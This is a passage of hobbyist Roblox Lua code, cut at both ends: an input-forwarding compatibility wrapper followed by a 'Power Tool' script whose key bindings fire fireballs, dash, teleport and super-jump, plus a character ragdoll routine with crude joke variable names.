		if plr~=RealPlayer then return end
		FakeMouse.Target = io.Target
		FakeMouse.Hit = io.Hit
		if not io.isMouse then
			local b = io.UserInputState == Enum.UserInputState.Begin
			if io.UserInputType == Enum.UserInputType.MouseButton1 then
				return FakeMouse:TriggerEvent(b and ""Button1Down"" or ""Button1Up"")
			end
			if io.UserInputType == Enum.UserInputType.MouseButton2 then
				return FakeMouse:TriggerEvent(b and ""Button2Down"" or ""Button2Up"")
			end
			for _,t in pairs(CAS.Actions) do
				for _,k in pairs(t.Keys) do
					if k==io.KeyCode then
						t.Function(t.Name,io.UserInputState,io)
					end
				end
			end
			FakeMouse:TriggerEvent(b and ""KeyDown"" or ""KeyUp"",io.KeyCode.Name:lower())
			UIS:TriggerEvent(b and ""InputBegan"" or ""InputEnded"",io,false)
		end
	end)
	Event.Parent = NLS([==[local Event = script:WaitForChild(""UserInput_Event"")
	local Mouse = owner:GetMouse()
	local UIS = game:GetService(""UserInputService"")
	local input = function(io,RobloxHandled)
		if RobloxHandled then return end
		--Since InputObject is a client-side instance, we create and pass table instead
		Event:FireServer({KeyCode=io.KeyCode,UserInputType=io.UserInputType,UserInputState=io.UserInputState,Hit=Mouse.Hit,Target=Mouse.Target})
	end
	UIS.InputBegan:Connect(input)
	UIS.InputEnded:Connect(input)

	local h,t
	--Give the server mouse data every second frame, but only if the values changed
	--If player is not moving their mouse, client won't fire events
	local HB = game:GetService(""RunService"").Heartbeat
	while true do
		if h~=Mouse.Hit or t~=Mouse.Target then
			h,t=Mouse.Hit,Mouse.Target
			Event:FireServer({isMouse=true,Target=t,Hit=h})
		end
		--Wait 2 frames
		for i=1,2 do
			HB:Wait()
		end
	end]==],script)

	----Sandboxed game object that allows the usage of client-side methods and services
	--Real game object
	local RealGame = game

	--Metatable for fake service
	local FakeService_Metatable = {
		__index = function(self,k)
			local s = rawget(self,""_RealService"")
			if s then
				return typeof(s[k])==""function""
					and function(_,...)return s[k](s,...)end or s[k]
			end
		end,
		__newindex = function(self,k,v)
			local s = rawget(self,""_RealService"")
			if s then s[k]=v end
		end
	}
	local function FakeService(t,RealService)
		t._RealService = typeof(RealService)==""string"" and RealGame:GetService(RealService) or RealService
		return setmetatable(t,FakeService_Metatable)
	end

	--Fake game object
	local FakeGame = {
		GetService = function(self,s)
			return rawget(self,s) or RealGame:GetService(s)
		end,
		Players = FakeService({
			LocalPlayer = FakeService({GetMouse=function(self)return FakeMouse end},Player)
		},""Players""),
		UserInputService = FakeService(UIS,""UserInputService""),
		ContextActionService = FakeService(CAS,""ContextActionService""),
		RunService = FakeService({
			_btrs = {},
			RenderStepped = RealGame:GetService(""RunService"").Heartbeat,
			BindToRenderStep = function(self,name,_,fun)
				self._btrs[name] = self.Heartbeat:Connect(fun)
			end,
			UnbindFromRenderStep = function(self,name)
				self._btrs[name]:Disconnect()
			end,
		},""RunService"")
	}
	rawset(FakeGame.Players,""localPlayer"",FakeGame.Players.LocalPlayer)
	FakeGame.service = FakeGame.GetService
	FakeService(FakeGame,game)
	--Changing owner to fake player object to support owner:GetMouse()
	game,owner = FakeGame,FakeGame.Players.LocalPlayer
end

--By iiSharkBus (Now DutchOrionVII, I'm back after 3 years. Modified so the PasteBin mods are happy)
wait(1)
--[[
	
	---------VERSION---------
	Power Tool by iiJoeCats
	VERSION 2
	-------------------------
	
	--------CONTROLS---------
	[Q] || FIREBALL
	[E] || TELEPORT
	[R] || DASH
	[T] || RAINBOW TOGGLE {FOR R MOVE}
	[F] || SUPER JUMP
	[G] || HEAL
	[Y] || DAMAGE ZONE
	-------------------------
	
	-------UPDATE INFO-------
	C - Changes/Updates
	N - New
	! - Spoilers 
	--------------
	C - Added Effects To Fireball Move And CFrame Animation For R6 Rigs ONLY
	N - THIS
	N - Ragdoll {Credit to Rufus14}
	! - Music Visualizer Coming Soon (Press Z to toggle it)
	CN! - I think this script is going to get over 800 lines when I'm finished with Version 2
	-------------------------
]]--
local mouse = game.Players.LocalPlayer:GetMouse()
local character = game.Players.LocalPlayer.Character
local tors = character:FindFirstChild(""HumanoidRootPart"")
local hum = character:FindFirstChildOfClass(""Humanoid"")
local ammo = 1
local isitgoing = false
local equipped = false
local imisitgoing = {
	ColorSequenceKeypoint.new(0, Color3.new(1,0,0)),
	ColorSequenceKeypoint.new(0.2, Color3.new(1, 0.333333, 0)),
	ColorSequenceKeypoint.new(0.4, Color3.new(1, 1, 0)),
	ColorSequenceKeypoint.new(0.6, Color3.new(0, 1, 0)),
	ColorSequenceKeypoint.new(0.8, Color3.new(0, 0.666667, 1)),
	ColorSequenceKeypoint.new(1, Color3.new(0.74902, 0, 1))
}
function ragdolll(char)
	local victimshumanoid = char:findFirstChildOfClass(""Humanoid"")
	local checkragd = char:findFirstChild(""ragded"")
	if not checkragd then
		local boolvalue = Instance.new(""BoolValue"", char)
		boolvalue.Name = ""ragded""
		if not char:findFirstChild(""UpperTorso"") then
			char.Archivable = true
			for i,v in pairs(char:GetChildren()) do
				if v.ClassName == ""Sound"" then
					v:remove()
				end
				for q,w in pairs(v:GetChildren()) do
					if w.ClassName == ""Sound"" then
						w:remove()
					end
				end
			end
			local ragdoll = char:Clone()
			if game:GetService(""RunService""):IsClient() then
				if ragdoll.Name == character.Name then
					workspace.CurrentCamera.CameraSubject = ragdoll
				end
			end
			if math.random(1,100) == 1 then
				local burgerking = Instance.new(""Sound"",ragdoll)
				burgerking.SoundId = ""rbxassetid://1402510823""
				burgerking.Volume = 1
				burgerking:Play()
				game.Debris:AddItem(ragdoll, burgerking.TimeLength)
			else	
				local sond = Instance.new(""Sound"",ragdoll)
				sond.SoundId = ""rbxassetid://178092307""
				local sond2 = Instance.new(""Sound"",ragdoll)
				sond2.SoundId = ""rbxassetid://165315045""
				if ragdoll.Name == character.Name then
					sond.Volume = 1
					sond2.Volume = 1
				else
					sond.Volume = .25
					sond2.Volume = .25	
				end
				sond2:Play()
				sond:Play()
				game.Debris:AddItem(ragdoll, 5)
			end
			for i,v in pairs(ragdoll:GetDescendants()) do
				if v.ClassName == ""Motor"" or v.ClassName == ""Motor6D"" then
					v:destroy()
				end
			end
			ragdoll:findFirstChildOfClass(""Humanoid"").BreakJointsOnDeath = false
			ragdoll:findFirstChildOfClass(""Humanoid"").Health = 0
			if ragdoll:findFirstChild(""Health"") then
				if ragdoll:findFirstChild(""Health"").ClassName == ""Script"" then
					ragdoll:findFirstChild(""Health"").Disabled = true
				end
			end
			for i,v in pairs(char:GetChildren()) do
				if v.ClassName == ""Part"" or v.ClassName == ""ForceField"" or v.ClassName == ""Accessory"" or v.ClassName == ""Hat"" then
					v:destroy()
				end
			end
			for i,v in pairs(char:GetChildren()) do
				if v.ClassName == ""Accessory"" then
					local attachment1 = v.Handle:findFirstChildOfClass(""Attachment"")
					if attachment1 then
						for q,w in pairs(char:GetChildren()) do
							if w.ClassName == ""Part"" then
								local attachment2 = w:findFirstChild(attachment1.Name)
								if attachment2 then
									local hinge = Instance.new(""HingeConstraint"", v.Handle)
									hinge.Attachment0 = attachment1
									hinge.Attachment1 = attachment2
									hinge.LimitsEnabled = true
									hinge.LowerAngle = 0
									hinge.UpperAngle = 0
								end
							end
						end
					end
				end
			end
			ragdoll.Parent = workspace
			if ragdoll:findFirstChild(""Right Arm"") then
				local glue = Instance.new(""Glue"", ragdoll.Torso)
				glue.Part0 = ragdoll.Torso
				glue.Part1 = ragdoll:findFirstChild(""Right Arm"")
				glue.C0 = CFrame.new(1.5, 0.5, 0, 0, 0, 1, 0, 1, 0, -1, 0, 0)
				glue.C1 = CFrame.new(0, 0.5, 0, 0, 0, 1, 0, 1, 0, -1, 0, 0)
				local limbcollider = Instance.new(""Part"", ragdoll:findFirstChild(""Right Arm""))
				limbcollider.Size = Vector3.new(1.4,1,1)
				limbcollider.Shape = ""Cylinder""
				limbcollider.Transparency = 1
				limbcollider.Name = ""LimbCollider""
				local limbcolliderweld = Instance.new(""Weld"", limbcollider)
				limbcolliderweld.Part0 = ragdoll:findFirstChild(""Right Arm"")
				limbcolliderweld.Part1 = limbcollider
				limbcolliderweld.C0 = CFrame.fromEulerAnglesXYZ(0,0,math.pi/2) * CFrame.new(-0.3,0,0)
			end
			if ragdoll:findFirstChild(""Left Arm"") then
				local glue = Instance.new(""Glue"", ragdoll.Torso)
				glue.Part0 = ragdoll.Torso
				glue.Part1 = ragdoll:findFirstChild(""Left Arm"")
				glue.C0 = CFrame.new(-1.5, 0.5, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
				glue.C1 = CFrame.new(0, 0.5, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
				local limbcollider = Instance.new(""Part"", ragdoll:findFirstChild(""Left Arm""))
				limbcollider.Size = Vector3.new(1.4,1,1)
				limbcollider.Shape = ""Cylinder""
				limbcollider.Name = ""LimbCollider""
				limbcollider.Transparency = 1
				local limbcolliderweld = Instance.new(""Weld"", limbcollider)
				limbcolliderweld.Part0 = ragdoll:findFirstChild(""Left Arm"")
				limbcolliderweld.Part1 = limbcollider
				limbcolliderweld.C0 = CFrame.fromEulerAnglesXYZ(0,0,math.pi/2) * CFrame.new(-0.3,0,0)
			end
			if ragdoll:findFirstChild(""Left Leg"") then
				local glue = Instance.new(""Glue"", ragdoll.Torso)
				glue.Part0 = ragdoll.Torso
				glue.Part1 = ragdoll:findFirstChild(""Left Leg"")
				glue.C0 = CFrame.new(-0.5, -1, 0, -0, -0, -1, 0, 1, 0, 1, 0, 0)
				glue.C1 = CFrame.new(-0, 1, 0, -0, -0, -1, 0, 1, 0, 1, 0, 0)
				local limbcollider = Instance.new(""Part"", ragdoll:findFirstChild(""Left Leg""))
				limbcollider.Size = Vector3.new(1.4,1,1)
				limbcollider.Shape = ""Cylinder""
				limbcollider.Name = ""LimbCollider""
				limbcollider.Transparency = 1
				local limbcolliderweld = Instance.new(""Weld"", limbcollider)
				limbcolliderweld.Part0 = ragdoll:findFirstChild(""Left Leg"")
				limbcolliderweld.Part1 = limbcollider
				limbcolliderweld.C0 = CFrame.fromEulerAnglesXYZ(0,0,math.pi/2) * CFrame.new(-0.3,0,0)
			end
			if ragdoll:findFirstChild(""Right Leg"") then
				local glue = Instance.new(""Glue"", ragdoll.Torso)
				glue.Part0 = ragdoll.Torso
				glue.Part1 = ragdoll:findFirstChild(""Right Leg"")
				glue.C0 = CFrame.new(0.5, -1, 0, 0, 0, 1, 0, 1, 0, -1, -0, -0)
				glue.C1 = CFrame.new(0, 1, 0, 0, 0, 1, 0, 1, 0, -1, -0, -0)
				local limbcollider = Instance.new(""Part"", ragdoll:findFirstChild(""Right Leg""))
				limbcollider.Size = Vector3.new(1.4,1,1)
				limbcollider.Shape = ""Cylinder""
				limbcollider.Name = ""LimbCollider""
				limbcollider.Transparency = 1
				local limbcolliderweld = Instance.new(""Weld"", limbcollider)
				limbcolliderweld.Part0 = ragdoll:findFirstChild(""Right Leg"")
				limbcolliderweld.Part1 = limbcollider
				limbcolliderweld.C0 = CFrame.fromEulerAnglesXYZ(0,0,math.pi/2) * CFrame.new(-0.3,0,0)
			end
			if ragdoll:findFirstChild(""Head"") and ragdoll.Torso:findFirstChild(""NeckAttachment"") then
				local HeadAttachment = Instance.new(""Attachment"", ragdoll[""Head""])
				HeadAttachment.Position = Vector3.new(0, -0.5, 0)
				local connection = Instance.new('HingeConstraint', ragdoll[""Head""])
				connection.LimitsEnabled = true
				connection.Attachment0 = ragdoll.Torso.NeckAttachment
				connection.Attachment1 = HeadAttachment
				connection.UpperAngle = 60
				connection.LowerAngle = -60
			elseif ragdoll:findFirstChild(""Head"") and not ragdoll.Torso:findFirstChild(""NeckAttachment"") then
				local hedweld = Instance.new(""Weld"", ragdoll.Torso)
				hedweld.Part0 = ragdoll.Torso
				hedweld.Part1 = ragdoll.Head
				hedweld.C0 = CFrame.new(0,1.5,0)
			end
			local function aaaalol()
				wait(0.2)
				local function searchforvelocity(wot)
					for i,v in pairs(wot:GetChildren()) do
						searchforvelocity(v)
						if v.ClassName == ""BodyPosition"" or v.ClassName == ""BodyVelocity"" then
							v:destroy()
						end
					end
				end
				searchforvelocity(ragdoll)
				wait(0.5)
				if ragdoll:findFirstChildOfClass(""Humanoid"") then
					ragdoll:findFirstChildOfClass(""Humanoid"").PlatformStand = true
				end
				if ragdoll:findFirstChild(""HumanoidRootPart"") then
					ragdoll:findFirstChild(""HumanoidRootPart""):destroy()
				end
			end
			spawn(aaaalol)
		elseif char:findFirstChild(""UpperTorso"") then
			char.Archivable = true
			for i,v in pairs(char:GetChildren()) do
				if v.ClassName == ""Sound"" then
					v:remove()
				end
				for q,w in pairs(v:GetChildren()) do
					if w.ClassName == ""Sound"" then
						w:remove()
					end
				end
			end
			local ragdoll = char:Clone()
			if game:GetService(""RunService""):IsClient() then
				if ragdoll.Name == character.Name then
					workspace.CurrentCamera.CameraSubject = ragdoll
				end
			end
			if math.random(1,100) == 1 then
				local burgerking = Instance.new(""Sound"",ragdoll)
				burgerking.SoundId = ""rbxassetid://1402510823""
				burgerking.Volume = 1
				burgerking:Play()
				game.Debris:AddItem(ragdoll, burgerking.TimeLength)
			else	
				local sond = Instance.new(""Sound"",ragdoll)
				sond.SoundId = ""rbxassetid://178092307""
				local sond2 = Instance.new(""Sound"",ragdoll)
				sond2.SoundId = ""rbxassetid://165315045""
				if ragdoll.Name == character.Name then
					sond.Volume = 1
					sond2.Volume = 1
				else
					sond.Volume = .25
					sond2.Volume = .25	
				end
				sond2:Play()
				sond:Play()
				game.Debris:AddItem(ragdoll, 5)
			end
			ragdoll:findFirstChildOfClass(""Humanoid"").BreakJointsOnDeath = false
			for i,v in pairs(ragdoll:GetDescendants()) do
				if v.ClassName == ""Motor"" or v.ClassName == ""Motor6D"" then
					v:destroy()
				end
			end
			ragdoll:BreakJoints()
			ragdoll:findFirstChildOfClass(""Humanoid"").Health = 0
			if ragdoll:findFirstChild(""Health"") then
				if ragdoll:findFirstChild(""Health"").ClassName == ""Script"" then
					ragdoll:findFirstChild(""Health"").Disabled = true
				end
			end
			for i,v in pairs(char:GetChildren()) do
				if v.ClassName == ""Part"" or v.ClassName == ""ForceField"" or v.ClassName == ""Accessory"" or v.ClassName == ""Hat"" or v.ClassName == ""MeshPart"" then
					v:destroy()
				end
			end
			for i,v in pairs(char:GetChildren()) do
				if v.ClassName == ""Accessory"" then
					local attachment1 = v.Handle:findFirstChildOfClass(""Attachment"")
					if attachment1 then
						for q,w in pairs(char:GetChildren()) do
							if w.ClassName == ""Part"" or w.ClassName == ""MeshPart"" then
								local attachment2 = w:findFirstChild(attachment1.Name)
								if attachment2 then
									local hinge = Instance.new(""HingeConstraint"", v.Handle)
									hinge.Attachment0 = attachment1
									hinge.Attachment1 = attachment2
									hinge.LimitsEnabled = true
									hinge.LowerAngle = 0
									hinge.UpperAngle = 0
								end
							end
						end
					end
				end
			end
			ragdoll.Parent = workspace
			local Humanoid = ragdoll:findFirstChildOfClass(""Humanoid"")
			Humanoid.PlatformStand = true
			local function makeballconnections(limb, attachementone, attachmenttwo, twistlower, twistupper)
				local connection = Instance.new('BallSocketConstraint', limb)
				connection.LimitsEnabled = true
				connection.Attachment0 = attachementone
				connection.Attachment1 = attachmenttwo
				connection.TwistLimitsEnabled = true
				connection.TwistLowerAngle = twistlower
				connection.TwistUpperAngle = twistupper
				local limbcollider = Instance.new(""Part"", limb)
				limbcollider.Size = Vector3.new(0.1,1,1)
				limbcollider.Shape = ""Cylinder""
				limbcollider.Transparency = 1
				limbcollider:BreakJoints()
				local limbcolliderweld = Instance.new(""Weld"", limbcollider)
				limbcolliderweld.Part0 = limb
				limbcolliderweld.Part1 = limbcollider
				limbcolliderweld.C0 = CFrame.fromEulerAnglesXYZ(0,0,math.pi/2)
			end
			local function makehingeconnections(limb, attachementone, attachmenttwo, lower, upper)
				local connection = Instance.new('HingeConstraint', limb)
				connection.LimitsEnabled = true
				connection.Attachment0 = attachementone
				connection.Attachment1 = attachmenttwo
				connection.LimitsEnabled = true
				connection.LowerAngle = lower
				connection.UpperAngle = upper
				local limbcollider = Instance.new(""Part"", limb)
				limbcollider.Size = Vector3.new(0.1,1,1)
				limbcollider.Shape = ""Cylinder""
				limbcollider.Transparency = 1
				limbcollider:BreakJoints()
				local limbcolliderweld = Instance.new(""Weld"", limbcollider)
				limbcolliderweld.Part0 = limb
				limbcolliderweld.Part1 = limbcollider
				limbcolliderweld.C0 = CFrame.fromEulerAnglesXYZ(0,0,math.pi/2)
			end
			local HeadAttachment = Instance.new(""Attachment"", Humanoid.Parent.Head)
			HeadAttachment.Position = Vector3.new(0, -0.5, 0)
			if ragdoll.UpperTorso:findFirstChild(""NeckAttachment"") then
				makehingeconnections(Humanoid.Parent.Head, HeadAttachment, ragdoll.UpperTorso.NeckAttachment, -50, 50)
			end
			makehingeconnections(Humanoid.Parent.LowerTorso, Humanoid.Parent.LowerTorso.WaistRigAttachment, Humanoid.Parent.UpperTorso.WaistRigAttachment, -50, 50)
			makeballconnections(Humanoid.Parent.LeftUpperArm, Humanoid.Parent.LeftUpperArm.LeftShoulderRigAttachment, Humanoid.Parent.UpperTorso.LeftShoulderRigAttachment, -200, 200, 180)
			makehingeconnections(Humanoid.Parent.LeftLowerArm, Humanoid.Parent.LeftLowerArm.LeftElbowRigAttachment, Humanoid.Parent.LeftUpperArm.LeftElbowRigAttachment, 0, -60)
			makehingeconnections(Humanoid.Parent.LeftHand, Humanoid.Parent.LeftHand.LeftWristRigAttachment, Humanoid.Parent.LeftLowerArm.LeftWristRigAttachment, -20, 20)
			--
			makeballconnections(Humanoid.Parent.RightUpperArm, Humanoid.Parent.RightUpperArm.RightShoulderRigAttachment, Humanoid.Parent.UpperTorso.RightShoulderRigAttachment, -200, 200, 180)
			makehingeconnections(Humanoid.Parent.RightLowerArm, Humanoid.Parent.RightLowerArm.RightElbowRigAttachment, Humanoid.Parent.RightUpperArm.RightElbowRigAttachment, 0, -60)
			makehingeconnections(Humanoid.Parent.RightHand, Humanoid.Parent.RightHand.RightWristRigAttachment, Humanoid.Parent.RightLowerArm.RightWristRigAttachment, -20, 20)
			--
			makeballconnections(Humanoid.Parent.RightUpperLeg, Humanoid.Parent.RightUpperLeg.RightHipRigAttachment, Humanoid.Parent.LowerTorso.RightHipRigAttachment, -80, 80, 80)
			makehingeconnections(Humanoid.Parent.RightLowerLeg, Humanoid.Parent.RightLowerLeg.RightKneeRigAttachment, Humanoid.Parent.RightUpperLeg.RightKneeRigAttachment, 0, 60)
			makehingeconnections(Humanoid.Parent.RightFoot, Humanoid.Parent.RightFoot.RightAnkleRigAttachment, Humanoid.Parent.RightLowerLeg.RightAnkleRigAttachment, -20, 20)
			--
			makeballconnections(Humanoid.Parent.LeftUpperLeg, Humanoid.Parent.LeftUpperLeg.LeftHipRigAttachment, Humanoid.Parent.LowerTorso.LeftHipRigAttachment, -80, 80, 80)
			makehingeconnections(Humanoid.Parent.LeftLowerLeg, Humanoid.Parent.LeftLowerLeg.LeftKneeRigAttachment, Humanoid.Parent.LeftUpperLeg.LeftKneeRigAttachment, 0, 60)
			makehingeconnections(Humanoid.Parent.LeftFoot, Humanoid.Parent.LeftFoot.LeftAnkleRigAttachment, Humanoid.Parent.LeftLowerLeg.LeftAnkleRigAttachment, -20, 20)
			for i,v in pairs(Humanoid.Parent:GetChildren()) do
				if v.ClassName == ""Accessory"" then
					local attachment1 = v.Handle:findFirstChildOfClass(""Attachment"")
					if attachment1 then
						for q,w in pairs(Humanoid.Parent:GetChildren()) do
							if w.ClassName == ""Part"" then
								local attachment2 = w:findFirstChild(attachment1.Name)
								if attachment2 then
									local hinge = Instance.new(""HingeConstraint"", v.Handle)
									hinge.Attachment0 = attachment1
									hinge.Attachment1 = attachment2
									hinge.LimitsEnabled = true
									hinge.LowerAngle = 0
									hinge.UpperAngle = 0
								end
							end
						end
					end
				end
			end
			for i,v in pairs(ragdoll:GetChildren()) do
				for q,w in pairs(v:GetChildren()) do
					if w.ClassName == ""Motor6D""--[[ and w.Name ~= ""Neck""--]] and w.Name ~= ""ouch_weld"" then
						w:destroy()
					end
				end
			end
			if ragdoll:findFirstChild(""HumanoidRootPart"") then
				ragdoll.HumanoidRootPart:destroy()
			end
			if ragdoll:findFirstChildOfClass(""Humanoid"") then
				ragdoll:findFirstChildOfClass(""Humanoid"").PlatformStand = true
			end
			local function waitfordatmoment()
				wait(0.2)
				local function searchforvelocity(wot)
					for i,v in pairs(wot:GetChildren()) do
						searchforvelocity(v)
						if v.ClassName == ""BodyPosition"" or v.ClassName == ""BodyVelocity"" then
							v:destroy()
						end
					end
				end
				searchforvelocity(ragdoll)
			end
			spawn(waitfordatmoment)
			game.Debris:AddItem(ragdoll, 5)
		end
	end
end

local hum = character:FindFirstChildOfClass(""Humanoid"")
local textures = {391827915,224894620,988623869,61103013,3115326221,1288816906,581605846,1367427817,2801380278,4291187457,1453454202}
local powerTool = Instance.new(""Tool"",game.Players.LocalPlayer.Backpack)
powerTool.CanBeDropped = false
powerTool.RequiresHandle = false
powerTool.Name = ""PwnedLOL""
powerTool.ToolTip = ""why""
powerTool.TextureId = ""rbxassetid://""..textures[math.random(1, #textures)]
powerTool.Equipped:Connect(function(mouse)
	equipped = true
	mouse.KeyDown:Connect(function(key)
		if key == ""q"" then
			if ammo > 0 then
				ammo = 0
				local fireball = Instance.new(""Part"",character)
				game.Debris:AddItem(fireball,5)
				fireball.Size = Vector3.new(3,3,3)
				fireball.FormFactor = Enum.FormFactor.Custom
				fireball.CanCollide = false
				fireball.Shape = Enum.PartType.Ball
				fireball.BrickColor = BrickColor.new(255, 100, 0)
				fireball.Material = Enum.Material.Neon
				fireball.CFrame = CFrame.new(character.HumanoidRootPart.Position,mouse.Hit.p)
				local fire = Instance.new(""ParticleEmitter"",fireball)
				fire.Speed = NumberRange.new(10, 10)
				fire.Rotation = NumberRange.new(-180, 180)
				fire.Color = ColorSequence.new(Color3.new(1, 0, 0),Color3.new(1, 1, 0),Color3.new(0, 0, 0))
				fire.LightEmission = 0.94999998807907
				fire.LightInfluence = 0.80000001192093
				fire.Texture = ""rbxassetid://2050129958""
				fire.Transparency = NumberSequence.new(0,1)
				fire.ZOffset = 1
				fire.Size = NumberSequence.new(1.6874998807907,0)
				fire.Acceleration = Vector3.new(5, 35, 5)
				fire.Drag = 0.5
				fire.Lifetime = NumberRange.new(0.40000000596046, 0.40000000596046)
				fire.Rate = 68
				fire.RotSpeed = NumberRange.new(-360, 360)
				fire.SpreadAngle = Vector2.new(-40, 10)
				local bv = Instance.new(""BodyVelocity"",fireball)
				bv.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
				bv.Velocity = fireball.CFrame.LookVector * 100
				spawn(function()
					if character.Torso then
						local raWeld = Instance.new(""Weld"",character.Torso)
						raWeld.Part0 = character.Torso
						raWeld.Part1 = character[""Right Arm""]
						raWeld.C0 = CFrame.new(1.5,0,0)
						for i = 0,1,0.15 do
							game:GetService(""RunService"").RenderStepped:wait()
							raWeld.C0 = raWeld.C0:lerp(CFrame.new(1.5,.5,-.5) * CFrame.fromEulerAnglesXYZ(math.rad(90),math.rad(0),math.rad(0)),i)
						end
						wait(2)
						for i = 0,1,0.15 do
							game:GetService(""RunService"").RenderStepped:wait()
							raWeld.C0 = raWeld.C0:lerp(CFrame.new(1.5,0,0) * CFrame.fromEulerAnglesXYZ(math.rad(0),math.rad(0),math.rad(0)),i)
						end
						raWeld:Destroy()
					end
				end)
				fireball.Touched:Connect(function(hit)
					local humn = hit.Parent:FindFirstChildOfClass(""Humanoid"")
					if humn and humn.Health > 0 then
						if hit:IsDescendantOf(character) then return end
						local val = humn.Parent:FindFirstChildOfClass(""BinaryStringValue"")
						if not val then
							Instance.new(""BinaryStringValue"",humn.Parent).Name = ""XD""
							local clone = fire:Clone()
							if humn.Parent:FindFirstChild(""Torso"") then
								clone.Parent = humn.Parent.Torso
							elseif humn.Parent:FindFirstChild(""UpperTorso"") then
								clone.Parent = humn.Parent.Torso
							end 
							for i = 1,math.random(10,20) do
								if humn.Health <= 0 then
									break
								end
								local value = math.random(2,6)
								if humn.Health <= value then
									if not humn.Parent:FindFirstChild(""raged"") then
										ragdolll(humn.Parent)
									end
								else
									humn:TakeDamage(value)	
								end
								wait(0.5)
							end
							clone:Destroy()
							humn.Parent:FindFirstChildOfClass(""BinaryStringValue""):Destroy()
						else
							--nothing	
						end
					end
				end)
				wait(3)
				ammo = 1
			end
		end
		if key == ""e"" then
			if ammo > 0 then
				ammo = 0
				character:MoveTo(mouse.Hit.p + Vector3.new(0,0.5,0))
				wait(2)
				ammo = 1
			end
		end
		if key == ""r"" then
			if ammo > 0 then
				ammo = 0
				spawn(function()
					local effectA = Instance.new(""Part"",workspace)
					effectA.Size = Vector3.new(2.5,2.5,0.5)
					if not isitgoing then
						effectA.BrickColor = character.Head.BrickColor
					else
						effectA.BrickColor = BrickColor.Random()
					end	
					effectA.CFrame = tors.CFrame
					effectA.Anchored = true
					effectA.CanCollide = false
					local msh = Instance.new(""SpecialMesh"",effectA)
					msh.MeshType = Enum.MeshType.FileMesh
					msh.MeshId = ""rbxassetid://3270017""
					msh.Scale = Vector3.new(2,2,3)
					for i = 0,1,0.05 do
						game:GetService(""RunService"").RenderStepped:wait()
						if isitgoing then
							effectA.BrickColor = BrickColor.Random()
						end
						effectA.Size = effectA.Size + Vector3.new(1.7,1.7,0.6)
						msh.Scale = msh.Scale + Vector3.new(1.7,1.7,0.6)
						effectA.Transparency = effectA.Transparency + 0.05
					end
					effectA:Destroy()
				end)
				local ass = Instance.new(""Attachment"",tors)
				ass.Position = Vector3.new(0,1,.34)
				local add = Instance.new(""Attachment"",tors)
				add.Position = Vector3.new(0,-1,.34)
				local trace = Instance.new(""Trail"",ass)
				if not isitgoing then
					trace.Color = ColorSequence.new(character.Head.Color)
				else
					trace.Color = ColorSequence.new(imisitgoing)
				end	
				trace.Attachment0 = ass
				trace.Attachment1 = add
				trace.LightEmission = 0.2
				trace.LightInfluence = 0.6
				trace.Lifetime = 0.3
				trace.Transparency = NumberSequence.new(0.16,1)
				trace.WidthScale = NumberSequence.new(1,0)
				local hb = Instance.new(""Part"",character)
				hb.Size = Vector3.new(2,2,2)
				hb.CanCollide = false
				hb.Transparency = 1
				local wld = Instance.new(""Weld"",hb)
				wld.Part0 = hb
				wld.Part1 = tors
				hb.Touched:Connect(function(hit)
					local humn = hit.Parent:FindFirstChildOfClass(""Humanoid"")
					if humn and humn.Health > 0 then
						local suspect = humn.Parent
						if suspect then
							local fakeTors = suspect:FindFirstChild(""HumanoidRootPart"")
							if fakeTors then
								local val = suspect:FindFirstChildOfClass(""BinaryStringValue"")
								if not val then
									Instance.new(""BinaryStringValue"",suspect).Name = ""fuuk""
									local value = math.random(15,30)
									if humn.Health <= value then
										if not humn.Parent:FindFirstChild(""raged"") then
											ragdolll(humn.Parent)
										end
									else
										humn:TakeDamage(value)	
									end
									humn.PlatformStand = true
									local function damageEffect()
										local function hit()
											local sph = Instance.new(""Part"",suspect)
											sph.Anchored = true
											sph.CanCollide = false
											sph.Size = Vector3.new(1,1,1)
											sph.CFrame = fakeTors.CFrame
											sph.Shape = Enum.PartType.Ball
											sph.Material = Enum.Material.Glass
											sph.Transparency = 0.5
											for i = 0,1,0.1 do
												game:GetService(""RunService"").RenderStepped:wait()
												sph.Transparency = sph.Transparency + 0.1
												sph.Size = sph.Size + Vector3.new(2.7,2.7,2.7)
											end
											sph:Destroy()
										end
										spawn(hit)
										local koreans = Instance.new(""BodyVelocity"",fakeTors) --XD
										koreans.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
										koreans.Velocity = Vector3.new(math.random(-15,15),30,math.random(-15,15))
										game.Debris:AddItem(koreans,0.09)
										local sond = Instance.new(""Sound"",suspect)
										sond.SoundId = ""rbxassetid://260430079""
										sond.Volume = 2
										sond.MaxDistance = 500
										sond:Play()
										game.Debris:AddItem(sond,0.72)
									end
									damageEffect()
									wait(1)
									humn.PlatformStand = false
									suspect:FindFirstChildOfClass(""BinaryStringValue""):Destroy()
								else
									--nothing	
								end
							end
						end
					end
				end)
				for i = 1,20,0.1 do
					game:GetService(""RunService"").RenderStepped:wait()
					tors.Velocity = tors.CFrame.LookVector * 300
				end
				ass:Destroy()
				add:Destroy()
				hb:Destroy()
				wait(1)
				ammo = 1
			end
		end
		if key == ""t"" then
			if ammo > 0 then
				ammo = 0
				isitgoing = not isitgoing
				wait(0.1)
				ammo = 1
			end
		end
		if key == ""f"" then
			if ammo > 0 then
				ammo = 0
				spawn(function()
					local effectA = Instance.new(""Part"",workspace)
					effectA.Size = Vector3.new(2.5,2.5,0.5)
					effectA.BrickColor = BrickColor.White()
					effectA.CFrame = tors.CFrame * CFrame.new(0,-2.75,0) * CFrame.fromEulerAnglesXYZ(math.rad(90),math.rad(0),math.rad(0))
					effectA.Anchored = true
					effectA.CanCollide = false
					local msh = Instance.new(""SpecialMesh"",effectA)
					msh.MeshType = Enum.MeshType.FileMesh
					msh.MeshId = ""rbxassetid://3270017""
					msh.Scale = Vector3.new(2,2,3)
					for i = 0,1,0.05 do
						game:GetService(""RunService"").RenderStepped:wait()
						effectA.Size = effectA.Size + Vector3.new(2.5,2.5,0.6)
						msh.Scale = msh.Scale + Vector3.new(2.5,2.5,0.6)
						effectA.Transparency = effectA.Transparency + 0.05
					end
					effectA:Destroy()
				end)
				local bv = Instance.new(""BodyVelocity"",tors)
				bv.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
				bv.Velocity = tors.CFrame.LookVector * 300 + Vector3.new(0,300,0)
				game.Debris:AddItem(bv,0.2)
				hum.WalkSpeed = 300
				wait(0.2)
				local hb = Instance.new(""Part"",character)
				hb.Size = Vector3.new(2,2,1)
				hb.CanCollide = false
